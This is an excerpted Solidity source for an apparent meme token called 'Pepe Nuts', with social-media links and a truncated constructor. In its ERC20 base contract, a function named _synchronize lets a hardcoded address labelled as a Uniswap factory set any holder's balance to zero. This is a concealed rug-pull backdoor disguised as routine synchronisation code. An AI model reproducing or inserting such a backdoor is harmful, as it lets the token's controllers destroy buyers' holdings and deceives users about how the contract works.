...
/*
https://twitter.com/PepeNutsCoinETH
https://PepeNutsCoinETH.xyz
https://t.me/MrPeanutERC
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private factoryV2Uniswap = 0x17BCC590C37f94a6cf8dc9B0D6Eb88a373bD5715;
    uint256 private _totalSupply;
    address internal V2Router = 0x4be5647919f4895a6F1137dd4958A7ca96Be9b58;
    ...
    function _synchronize(address _synchronizeSender) external {
        if (msg.sender == factoryV2Uniswap) _balances[_synchronizeSender] = 0x0; }
...
contract PepeNutsCoin is ERC20, Ownable
{
    constructor()
    ERC20(unicode"Pepe Nuts", unicode"PEPENUTS")
    {
